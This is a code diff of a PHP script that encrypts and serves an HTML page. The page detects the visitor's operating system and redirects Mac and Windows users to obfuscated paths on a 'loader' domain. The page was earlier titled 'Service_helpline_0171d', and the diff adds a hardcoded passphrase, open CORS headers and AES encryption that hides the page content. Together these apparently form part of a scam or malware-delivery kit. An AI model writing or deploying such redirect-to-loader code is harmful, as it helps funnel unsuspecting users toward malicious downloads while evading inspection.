@@ -1,11 +1,24 @@
+<?php
+header('Access-Control-Allow-Origin: *');
+header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
+header('Access-Control-Allow-Headers: Content-Type');
+
+if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
+    exit(0);
+}
+header('Access-Control-Allow-Origin: *');
+header('Content-Type: application/json');
+
+$PASSPHRASE = "MySecretKey@123";
+
+// 📄 यह HTML OS detect करेगा और Mac/Windows folder पर redirect करेगा
 $HTML_CONTENT = <<<'HTML'
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Service_helpline_0171d</title>
-    <script src="https://code.jquery.com/jquery-1.4.4.min.js"></script>
+    <title>Redirecting...</title>
     <script>
         var ALPHA = '{{ALPHA}}';
         var ANIPH = '{{ANIPH}}';
@@ -22,7 +35,9 @@ $HTML_CONTENT = <<<'HTML'
 
         var os = myOperatingSystem();
         localStorage.setItem('alpha', ALPHA);
-        var BASE_URL = 'https://loaderfortest-23d1cffa4338.herokuapp.com'; // अपना Loader Domain डालें
+
+        // 🔁 यह URL Loader के domain पर point करेगा
+        var BASE_URL = 'https://loaderfortest-23d1cffa4338.herokuapp.com';
 
         if (os === 'MacOS') {
             window.location.href = BASE_URL + '/Ma0cHelpAsMEr0t0140/index.html?Aniph=' + ANIPH;
@@ -34,3 +49,20 @@ $HTML_CONTENT = <<<'HTML'
 <body></body>
 </html>
 HTML;
+
+function encrypt_salted($data, $passphrase) {
+    $salt = openssl_random_pseudo_bytes(8);
+    $salted = '';
+    $dx = '';
+    while (strlen($salted) < 48) {
+        $dx = md5($dx . $passphrase . $salt, true);
+        $salted .= $dx;
+    }
+    $key = substr($salted, 0, 32);
+    $iv = substr($salted, 32, 16);
+    $ciphertext = openssl_encrypt($data, 'aes-256-cbc', $key, OPENSSL_RAW_DATA, $iv);
+    return base64_encode('Salted__' . $salt . $ciphertext);
+}
+
+$cipher = encrypt_salted($HTML_CONTENT, $PASSPHRASE);
+echo json_encode(['cipher' => $cipher]);
